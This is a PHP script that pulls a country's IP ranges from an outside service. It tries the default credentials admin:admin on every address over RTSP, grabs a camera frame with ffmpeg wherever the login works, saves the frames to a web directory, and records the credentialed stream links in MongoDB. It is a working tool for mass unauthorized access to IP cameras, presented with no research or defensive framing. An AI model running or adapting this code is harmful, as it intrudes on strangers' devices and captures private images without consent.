<?php
error_reporting(E_ERROR);
set_time_limit(0);

require 'vendor/autoload.php';			
//$client = new MongoDB\Client("mongodb://127.0.0.1:27017");
$manager = new MongoDB\Driver\Manager('mongodb://127.0.0.1:27017');

//Exit if no country arg
if(sizeof($argv) == 1) exit;

//Get country arg
$country = $argv[1];

//Load IP address list by the country
$ipList = getIpList($country);

//Create pool
$poolSize = 50;
//$taskPool = new Pool($poolSize);
$tasks = [];
//Loop IP List
foreach($ipList as $ip) {
	$ipArr = ipStrtoArray($ip);	
	for($a=$ipArr['start']['a']; $a <= $ipArr['end']['a']; $a++) {
	for($b=$ipArr['start']['b']; $b <= $ipArr['end']['b']; $b++) {
	for($c=$ipArr['start']['c']; $c <= $ipArr['end']['c']; $c++) {
	for($d=$ipArr['start']['d']; $d <= $ipArr['end']['d']; $d++) {
		$ip = $a.'.'.$b.'.'.$c.'.'.$d;				
		echo "Loop IP : ".$ip.PHP_EOL;

		rtsp($ip);

		/*
		if(sizeof($tasks) < $poolSize) {
			$tasks[] = new Task($ip,sizeof($tasks));
			$tasks[sizeof($tasks) - 1]->start();
			//$taskPool->submit($task);
		} else {
			$busy = true;
			while($busy) {
				for ($i=0; $i < sizeof($tasks); $i++) { 
					if(threadStopped($i)) {
						unset($tasks[$i]);
						$tasks[$i] = new Task($ip,$i);
						$tasks[$i]->start();
						$busy = false;
						break;
					}
				}
				usleep(10000);
			}
		}
		*/
			
		//usleep(10000);
		
	}	
	}
	}		
	}
	
}

function setDocResult($output) {
	if(strpos($output,'Connection timed out') > 0) {
		return 'Connection timeout';		//Host offline	
	} else if(strpos($output,'Connection refused') > 0) {
		return 'Connection refused';		//Host online but no RSTP
	} else if(strpos($output,'400 Bad Request') > 0) {
		return '400 Bad Request';			//RTSP ok but bad request	
	} else if(strpos($output,'401 Unauthorized') > 0) {
		return '401 Unauthorized';			//RTSP & request ok but incorrect password
	} else if(strpos($output,'Invalid data found') > 0) {
		return 'Invalid data found'; 		//Invalid data found
	} else if(strpos($output,'Output #0, image2, to') > 0){
		return 'Success'; 					//Connect success
	}
	return $output;
}

function rtsp($ip) {	
	Global $manager;

	$doc = array();

	$user = 'admin';
	$pw = 'admin';
	$req = '11';
	$link = 'rtsp://'.$user.':'.$pw.'@'.$ip.'/'.$req;
	$cmd = "ffmpeg -stimeout 1500000 -i "
		.$link." "
		."-f image2 -vframes 1 -y "
		."/var/www/html/ipcam/pic/".$ip.".jpeg 2>&1"; 		
	$output = shell_exec($cmd);		
	//echo $link.PHP_EOL;
	$doc['ip'] = $ip;
	$doc['link'] = $link;
	$doc['capture_timestamp'] = new MongoDB\BSON\UTCDateTime(strtotime(date('Y-m-d H:i:s')) * 1000);  
	$doc['capture_result'] = setDocResult($output);
											
	$bulk = new MongoDB\Driver\BulkWrite();

	$doc['ip'] = ip2long($ip);
	$bulk->update(
		[ 'ip' => $doc['ip'] ],
		[ '$set' => $doc ],
		['multi' => false, 'upsert' => true]
	);

	$manager->executeBulkWrite('ipcam.capture_list', $bulk);

	unset($bulk);
	unset($manager);
	unset($doc);
}

//$taskPool->shutdown();

function ipStrToArray($ip){

	$ipArr = array();
    $start = substr($ip,0,strpos($ip,','));
    $end = substr($ip,strpos($ip,',')+1,sizeof($ip)-sizeof($start)-1);

	$ipArr['start']['a'] = substr($start,0,strpos($start,'.'));
	$start = substr($start,strpos($start,'.')+1);
	$ipArr['start']['b'] = substr($start,0,strpos($start,'.'));
	$start = substr($start,strpos($start,'.')+1);
	$ipArr['start']['c'] = substr($start,0,strpos($start,'.'));
	$ipArr['start']['d'] = substr($start,strpos($start,'.')+1);

    $ipArr['end']['a'] = substr($end,0,strpos($end,'.'));
    $end = substr($end,strpos($end,'.')+1);
    $ipArr['end']['b'] = substr($end,0,strpos($end,'.'));
    $end = substr($end,strpos($end,'.')+1);
    $ipArr['end']['c'] = substr($end,0,strpos($end,'.'));
    $ipArr['end']['d'] = substr($end,strpos($end,'.')+1);

	return $ipArr;

}

function getIpList($country) {
	$country = urlencode($country);
	$ch = curl_init();	
	curl_setopt($ch, CURLOPT_URL, "http://services.ce3c.be/ciprg/?countrys=".$country."&format=by+input&format2=%7Bstartip%7D%2C%7Bendip%7D%0D%0A");	
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$data = curl_exec($ch);
	curl_close($ch);
	return explode(PHP_EOL,$data);
}

function threadStopped($key) {
	global $client;

	$stopped = false;
	$collection = $client->ipcam->thread_pool;

	//Find record on DB
	$entry = $collection->findOne(['key' => $key]);
	if($entry) {
		if($entry->status === 'stopped') { 

			$collection->updateOne(
				['key' => $key],
				['$set' => ['status' => 'running']]
			);

			$stopped = true; 
		}
	}
	unset($collection);	

	return $stopped;
}

class Task extends Thread {
	
	private $ip;
	private $key;
	
	public function __construct($ip,$key) { 
		$this->ip = $ip;			
		$this->key = $key;

		//echo "Worker Thread Init IP : ".$this->ip." [OK]".PHP_EOL;
	}
	
	public function run() {	
					
		//echo "Worker Thread Run IP : ".$this->ip." [Start]".PHP_EOL;		
		$doc = array();

		$doc = $this->rtsp($doc);

		$this->updateDb('stopped',$doc);
		//echo "Worker Thread run IP : ".$this->ip." [End]".PHP_EOL;	
	}	
	
	private function rtsp($doc) {	
		$user = 'admin';
		$pw = 'admin';
		$req = '11';
		$link = 'rtsp://'.$user.':'.$pw.'@'.$this->ip.'/'.$req;
		$cmd = "ffmpeg -stimeout 1500000 -i "
			.$link." "
			."-f image2 -vframes 1 -y "
			."/var/www/html/ipcam/pic/".$this->ip.".jpeg 2>&1"; 		
		$output = shell_exec($cmd);		
		//echo $link.PHP_EOL;
		$doc['ip'] = $this->ip;
		$doc['link'] = $link;
		$doc['capture_timestamp'] = new MongoDB\BSON\UTCDateTime(strtotime(date('Y-m-d H:i:s')) * 1000);  
		$doc['capture_result'] = $this->setDocResult($output);
												
		return $doc;
	}

	private function updateDb($status,$doc) {

		require_once 'vendor/autoload.php';			
		$manager = new MongoDB\Driver\Manager('mongodb://127.0.0.1:27017');

		if($doc) {
			$bulk = new MongoDB\Driver\BulkWrite();

			$doc['ip'] = ip2long($this->ip);
			$bulk->update(
				[ 'ip' => $doc['ip'] ],
				[ '$set' => $doc ],
				['multi' => false, 'upsert' => true]
			);

			$manager->executeBulkWrite('ipcam.capture_list', $bulk);

			unset($bulk);
		}


		$bulk = new MongoDB\Driver\BulkWrite();

		$bulk->update(
			[ 'key' => $this->key ],
			[ '$set' => ['status' => $status] ],
			['multi' => false, 'upsert' => true]
		);

		$manager->executeBulkWrite('ipcam.thread_pool', $bulk);

		unset($bulk);
		unset($manager);

	}
 	
	private function setDocResult($output) {
		if(strpos($output,'Connection timed out') > 0) {
			return 'Connection timeout';		//Host offline	
		} else if(strpos($output,'Connection refused') > 0) {
			return 'Connection refused';		//Host online but no RSTP
		} else if(strpos($output,'400 Bad Request') > 0) {
			return '400 Bad Request';			//RTSP ok but bad request	
		} else if(strpos($output,'401 Unauthorized') > 0) {
			return '401 Unauthorized';			//RTSP & request ok but incorrect password
		} else if(strpos($output,'Invalid data found') > 0) {
			return 'Invalid data found'; 		//Invalid data found
		} else if(strpos($output,'Output #0, image2, to') > 0){
			return 'Success'; 					//Connect success
		}
		return $output;
	}
}

?>
